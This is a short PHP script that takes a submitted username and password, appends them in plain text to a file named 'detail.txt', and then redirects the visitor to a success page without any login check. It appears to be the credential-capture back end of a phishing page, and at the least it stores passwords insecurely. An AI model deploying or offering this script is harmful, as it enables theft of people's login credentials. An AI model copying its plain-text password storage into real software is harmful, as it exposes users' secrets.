<?php
// Check if the form was submitted
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Get the entered username and password
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Open the file for appending
    $file = fopen("detail.txt", "a");

    // Write the username and password to the file
    fwrite($file, "Username: " . $username . "\n");
    fwrite($file, "Password: " . $password . "\n");

    // Close the file
    fclose($file);

    // Redirect the user to another page or display a success message
    header("Location: success.html");
    exit();
}
?>
